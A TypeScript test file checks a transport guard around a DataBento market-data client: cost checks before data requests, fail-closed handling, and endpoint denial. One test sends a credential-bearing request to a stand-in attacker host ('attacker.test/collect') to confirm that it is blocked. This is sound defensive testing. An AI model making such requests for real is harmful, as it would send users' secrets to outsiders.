import { afterEach, describe, expect, it, vi } from "vitest";
import { DataBentoHTTP } from "../../../src/http/databento-http.js";
import { installPlatformTransportGuard } from "../../../src/api/platform-transport.js";

let guard: ReturnType<typeof installPlatformTransportGuard> | undefined;
afterEach(() => { guard?.restore(); guard = undefined; vi.restoreAllMocks(); });

describe("platform transport cost and originals boundary", () => {
  it("requires raw numeric zero before each actual historical request and keeps omitted end", async () => {
    const request = { dataset: "GLBX.MDP3", symbols: "ES.c.0", schema: "ohlcv-1d",
      start: "2026-01-01", stype_in: "continuous", stype_out: "instrument_id", limit: 2, encoding: "csv" };
    const original = vi.spyOn(DataBentoHTTP.prototype, "get").mockImplementation(async (endpoint) =>
      endpoint === "/v0/metadata.get_cost" ? "0" : "ts_event,close\n1,5000000000000\n");
    guard = installPlatformTransportGuard("db-synthetic-key");
    const http = new DataBentoHTTP("db-synthetic-key");
    await http.get("/v0/timeseries.get_range", request);
    expect(original.mock.calls.map(call => call[0])).toEqual(["/v0/metadata.get_cost", "/v0/timeseries.get_range"]);
    expect(original.mock.calls[0][1]).toMatchObject({ dataset: request.dataset, symbols: request.symbols,
      schema: request.schema, start: request.start, stype_in: "continuous", limit: 2 });
    expect(original.mock.calls[0][1]).not.toHaveProperty("end");
    expect(original.mock.calls[1][1]).toEqual(request);
    expect(guard.originals).toHaveLength(2);
    expect(Buffer.from(guard.originals[0].data_base64, "base64").toString()).toBe("0");
    expect(guard.originals[1].representation).toBe("decoded_http_body");
    expect(guard.originals[1].sha256).toMatch(/^[a-f0-9]{64}$/);
    expect(guard.originals[1].request.parameters).toEqual(request);
  });
  it.each(["1", "-1", '"0"', '{"total_cost":0}', "null", "false", "NaN", "[]"])(
    "fails closed on cost response %s", async cost => {
      const original = vi.spyOn(DataBentoHTTP.prototype, "get").mockResolvedValue(cost);
      guard = installPlatformTransportGuard("db-fixture");
      await expect(new DataBentoHTTP("db-fixture").get("/v0/timeseries.get_range", {
        dataset: "GLBX.MDP3", symbols: "ES.c.0", schema: "trades", start: "2026-10-22"
      })).rejects.toThrow();
      expect(original).toHaveBeenCalledTimes(1);
      expect(original.mock.calls[0][0]).toBe("/v0/metadata.get_cost");
    });
  it("denies unknown endpoints and never captures leaked credentials", async () => {
    const original = vi.spyOn(DataBentoHTTP.prototype, "get").mockResolvedValue("db-credential-fixture");
    guard = installPlatformTransportGuard("db-credential-fixture");
    const http = new DataBentoHTTP("db-credential-fixture");
    await expect(http.get("https://attacker.test/collect", {})).rejects.toThrow();
    expect(original).not.toHaveBeenCalled();
    await expect(http.get("/v0/metadata.list_datasets", {})).rejects.toThrow();
    expect(guard.originals).toHaveLength(0);
  });
  it("cost failure does not reach data; successful metadata and symbology need no cost request", async () => {
    const original = vi.spyOn(DataBentoHTTP.prototype, "get").mockRejectedValue(new Error("private provider body"));
    const post = vi.spyOn(DataBentoHTTP.prototype, "postForm").mockResolvedValue('{"result":{}}');
    guard = installPlatformTransportGuard("db-fixture");
    const http = new DataBentoHTTP("db-fixture");
    await expect(http.get("/v0/timeseries.get_range", {dataset:"GLBX.MDP3", symbols:"ES.c.0",
      schema:"ohlcv-1d",start:"2026-01-01",end:"2026-01-02"})).rejects.toThrow();
    expect(original).toHaveBeenCalledTimes(1);
    await http.postForm("/v0/symbology.resolve", {dataset:"GLBX.MDP3",symbols:"ES.c.0"});
    expect(post).toHaveBeenCalledTimes(1);
    expect(guard.originals).toHaveLength(1);
  });
});
